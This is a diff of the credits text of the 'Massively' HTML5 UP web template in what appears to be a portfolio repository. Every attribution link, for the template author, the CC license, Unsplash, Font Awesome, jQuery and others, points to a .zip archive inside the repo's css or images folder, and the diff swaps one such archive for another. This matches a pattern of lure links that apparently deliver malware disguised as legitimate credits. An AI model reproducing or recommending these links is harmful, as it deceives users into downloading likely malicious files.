@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
+https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip | @ajlkn
+https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
+		Unsplash (https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip)
 
 	Icons:
-		Font Awesome (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
+		Font Awesome (https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip)
 
 	Other:
-		jQuery (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
-		Scrollex (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
-		Responsive Tools (https://github.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/raw/refs/heads/main/assets/css/DAT-ANALYS-B-PORTFOLIO-DEVELOPE-M-3.2.zip)
+		jQuery (https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip)
+		Scrollex (https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip)
+		Responsive Tools (https://raw.githubusercontent.com/FadelDia/MY_DATA_ANALYST-BI_DEVELOPER_PORTFOLIO/main/images/M_DEVELOPE_B_ANALYS_PORTFOLIO_DAT_v2.6-beta.5.zip)
